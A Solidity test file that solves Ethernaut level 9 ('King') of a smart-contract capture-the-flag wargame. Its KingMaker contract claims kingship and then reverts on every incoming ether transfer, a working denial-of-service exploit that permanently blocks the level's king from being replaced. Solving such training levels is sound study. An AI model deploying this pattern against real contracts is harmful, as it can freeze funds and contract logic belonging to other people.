// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface King {
    function prize() external returns (uint256);
}

contract KingMaker {
    constructor(address _kingContract) payable {
        // Send ether to the king contract to become king
        (bool success,) = _kingContract.call{value: msg.value}("");
    }

    receive() external payable {
        // This causes the transfer of ether to fail, preventing reclamation
        revert("Cannot receive either");
    }
}

contract Level9Test is EthernautTest {
    function testLevel9() public {
        // 0.001 ether needed to create level 9
        _createLevel("9", 0.001 ether);

        // We need to send the prize amount to the level contract
        // We call our king maker contract with that ether amount
        new KingMaker{value: King(levelInstance["9"]).prize()}(levelInstance["9"]);

        require(_submitLevel("9"));
    }

    receive() external payable {}
}
